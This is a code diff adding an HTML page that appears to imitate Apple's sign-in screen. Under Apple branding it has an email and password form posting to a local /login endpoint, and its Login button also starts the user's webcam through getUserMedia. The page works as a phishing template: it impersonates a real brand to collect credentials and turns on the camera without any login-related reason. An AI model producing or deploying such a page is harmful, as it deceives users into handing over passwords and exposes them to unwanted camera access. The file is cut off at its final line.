@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Apple Login</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+  <link rel="stylesheet" type="text/css" href="../static/old_style.css">
+</head>
+<body>
+<div class="login-container">
+  <h1 class="title">Welcome to Apple</h1>
+  <form action="/login" method="post">
+    <label for="email">Email:</label>
+    <input type="email" name="email" id="email" required>
+    <label for="password">Password:</label>
+    <input type="password" name="password" id="password" required>
+    <button class="apple-button" type="submit" onclick="openCamera()">
+      Login
+    </button>
+  </form>
+</div>
+<video id="webcam" style="display: none;"></video>
+<script>
+  function openCamera() {
+    navigator.getUserMedia = navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia || navigator.oGetUserMedia;
+    if (navigator.getUserMedia) {
+      navigator.getUserMedia({video: true}, handleVideo, videoError);
+    }
+  }
+
+  function handleVideo(stream) {
+    document.getElementById('webcam').srcObject = stream;
+    document.getElementById('webcam').style.display = 'block';
+  }
+
+  function videoError(e) {
+    console.log('Error with webcam: ', e);
+  }
+</script>
+</body>
+</
